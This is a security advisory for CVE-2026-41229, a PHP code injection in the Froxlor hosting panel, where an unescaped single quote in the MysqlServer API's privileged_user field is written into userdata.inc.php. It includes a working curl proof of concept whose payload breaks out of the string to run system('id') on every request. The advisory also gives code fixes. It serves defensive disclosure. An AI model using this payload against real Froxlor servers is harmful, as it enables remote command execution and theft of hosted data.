# [C] Froxlor has a PHP Code Injection via Unescaped Single Quotes in userdata.inc.php Generation (MysqlServer API)

## Summary
Severity: Critical
Advisory: GHSA-gc9w-cc93-rjv8
CVE: CVE-2026-41229
CWE: CWE-94
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-gc9w-cc93-rjv8
Type: github-advisory

## Affected
- Packagist: `froxlor/froxlor` — affected >=0 <2.3.6

## Details
## Summary

`PhpHelper::parseArrayToString()` writes string values into single-quoted PHP string literals without escaping single quotes. When an admin with `change_serversettings` permission adds or updates a MySQL server via the API, the `privileged_user` parameter (which has no input validation) is written unescaped into `lib/userdata.inc.php`. Since this file is `require`d on every request via `Database::getDB()`, an attacker can inject arbitrary PHP code that executes as the web server user on every subsequent page load.

## Details

The root cause is in `PhpHelper::parseArrayToString()` at `lib/Froxlor/PhpHelper.php:486`:

```php
// lib/Froxlor/PhpHelper.php:475-487
foreach ($array as $key => $value) {
    if (!is_array($value)) {
        if (is_bool($value)) {
            $str .= self::tabPrefix($depth, sprintf("'%s' => %s,\n", $key, $value ? 'true' : 'false'));
        } elseif (is_int($value)) {
            $str .= self::tabPrefix($depth, "'{$key}' => $value,\n");
        } else {
            if ($key == 'password') {
                // special case for passwords (nowdoc)
                $str .= self::tabPrefix($depth, "'{$key}' => <<<'EOT'\n{$value}\nEOT,\n");
            } else {
                // VULNERABLE: $value interpolated without escaping single quotes
                $str .= self::tabPrefix($depth, "'{$key}' => '{$value}',\n");
            }
        }
    }
}
```

Note that the `password` key receives special treatment via nowdoc syntax (line 484), which is safe because nowdoc does not interpret any escape sequences or variable interpolation. However, all other string keys — including `user`, `caption`, and `caFile` — are written directly into single-quoted PHP string literals with no escaping.

The attack path through `MysqlServer::add()` (`lib/Froxlor/Api/Commands/MysqlServer.php:80`):

1. `validateAccess()` (line 82) checks the caller is an admin with `change_serversettings`
2. `privileged_user` is read via `getParam()` at line 88 with **no validation** applied
3. `mysql_ca` is also read with no validation at line 86
4. The values are placed into the `$sql_root` array at lines 150-160
5. `generateNewUserData()` is called at line 162, which calls `PhpHelper::parseArrayToPhpFile()` → `parseArrayToString()`
6. The result is written to `lib/userdata.inc.php` via `file_put_contents()` (line 548)
7. Setting `test_connection=0` (line 92, 110) skips the PDO connection test, so no valid MySQL credentials are needed

The generated `userdata.inc.php` is loaded on **every request** via `Database::getDB()` at `lib/Froxlor/Database/Database.php:431`:

```php
require Froxlor::getInstallDir() . "/lib/userdata.inc.php";
```

The `MysqlServer::update()` method (line 337) has the identical vulnerability with `privileged_user` at line 387.

## PoC

**Step 1: Inject PHP code via MysqlServer.add API**

```bash
curl -s -X POST https://froxlor.example/api.php \
  -u 'ADMIN_APIKEY:ADMIN_APISECRET' \
  -H 'Content-Type: application/json' \
  -d '{
    "command": "MysqlServer.add",
    "params": {
      "mysql_host": "127.0.0.1",
      "mysql_port": 3306,
      "privileged_user": "x'\''.system(\"id\").'\''",
      "privileged_password": "anything",
      "description": "test",
      "test_connection": 0
    }
  }'
```

This writes the following into `lib/userdata.inc.php`:

```php
'user' => 'x'.system("id").'',
```

**Step 2: Trigger code execution**

Any subsequent HTTP request to the Froxlor panel triggers `Database::getDB()`, which `require`s `userdata.inc.php`, executing `system("id")` as the web server user:

```bash
curl -s https://froxlor.example/
```

The `id` output will appear in the response (or can be captured via out-of-band methods for blind execution).

**Step 3: Cleanup (attacker would also clean up)**

The injected code runs on every request until `userdata.inc.php` is regenerated or manually fixed.

## Impact

An admin with `change_serversettings` permission can escalate to **arbitrary OS command execution** as the web server user. This represents a scope change from the Froxlor application boundary to the underlying operating system:

- **Full server compromise**: Execute arbitrary commands as the web server user (typically `www-data`)
- **Data exfiltration**: Read all hosted customer data, databases credentials, TLS private keys
- **Lateral movement**: Access all MySQL databases using credentials stored in `userdata.inc.php`
- **Persistent backdoor**: The injected code executes on every request, providing persistent access
- **Denial of service**: Malformed PHP in `userdata.inc.php` can break the entire panel

The `description` field (validated with `REGEX_DESC_TEXT = /^[^\0\r\n<>]*$/`) and `mysql_ca` field (no validation) are also injectable vectors through the same code path.

## Recommended Fix

Escape single quotes in `PhpHelper::parseArrayToString()` before interpolating values into single-quoted PHP string literals. In single-quoted PHP strings, only `\'` and `\\` are interpreted, so both must be escaped:

```php
// lib/Froxlor/PhpHelper.php:486
// Before (vulnerable):
$str .= self::tabPrefix($depth, "'{$key}' => '{$value}',\n");

// After (fixed) - escape backslashes first, then single quotes:
$escaped = str_replace(['\\', "'"], ['\\\\', "\\'"], $value);
$str .= self::tabPrefix($depth, "'{$key}' => '{$escaped}',\n");
```

Alternatively, use the same nowdoc syntax already used for passwords for all string values, which provides complete injection safety:

```php
// Apply nowdoc to all string values, not just passwords:
$str .= self::tabPrefix($depth, "'{$key}' => <<<'EOT'\n{$value}\nEOT,\n");
```

Additionally, consider adding input validation to `privileged_user` and `mysql_ca` in `MysqlServer::add()` and `MysqlServer::update()` as defense-in-depth.

## References
- https://github.com/froxlor/froxlor/security/advisories/GHSA-gc9w-cc93-rjv8
- https://nvd.nist.gov/vuln/detail/CVE-2026-41229
- https://github.com/froxlor/froxlor/commit/3589ddf93ab59eb2a8971f0f56cbf6266d03c4ae
- https://github.com/froxlor/froxlor
- https://github.com/froxlor/froxlor/releases/tag/2.3.6
